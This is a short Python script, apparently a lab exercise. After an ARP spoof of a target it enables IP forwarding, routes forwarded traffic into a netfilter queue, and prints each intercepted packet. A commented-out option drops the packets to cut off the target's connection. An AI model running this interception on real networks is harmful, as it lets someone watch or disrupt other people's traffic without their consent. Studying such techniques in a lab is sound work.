#!/usr/bin/env python

'''
    ARP Spoof against the target
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -I FORWARD -j NFQUEUE --queue-num 0

    We use forward queue for remote computers
    If we want to test on our local machine, we must redirect the input and ouput packet chains


    Install netfilterqueue by:
    pip3 install -U git+https://github.com/kti/python-netfilterqueue

    run:
    iptables --flush
    when done
'''

# Access the queue by:
import netfilterqueue as nfq

def process(packet):
    print(packet)
    #to forward traffic
    packet.accept()
    # to cut off the connection of target
    #packet.drop()

queue = nfq.NetfilterQueue()
queue.bind(0, process)
queue.run()
